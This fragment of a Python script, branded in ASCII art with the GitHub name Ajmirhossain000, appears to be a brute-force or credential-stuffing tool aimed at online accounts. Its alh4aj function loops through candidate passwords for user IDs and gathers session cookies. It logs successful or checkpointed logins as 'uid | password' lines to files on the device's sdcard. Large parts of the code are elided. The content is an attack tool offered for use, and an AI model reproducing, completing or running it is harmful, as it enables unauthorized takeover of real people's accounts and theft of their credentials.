...
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                           ___   _   _ _____ _____ _   _ 
   ...
   Oo      OooOoo Oo      oO ooOoOOo `OooOOo.        
  o  O         O  O O    o o    O     o     `o       
 O    o        o  o  o  O  O    o     O      O       
oOooOoOo       O  O   Oo   O    O     o     .O       
o      O       o  O        o    o     OOooOO'        
O      o       O  o        O    O     o    o         
o      O O     o  o        O    O     O     O        
O.     O `OooOO'  O        o ooOOoOo  O      o       
...
╠══[GITHUB                   • \33[1;38mAjmirhossain000]   ║\33[1;34m   
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK Ajmir-OK.txt')
    print(' [😁] CP Ajmir-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[AJMIR-OK]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
""")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mAjmir-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/AjmirCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
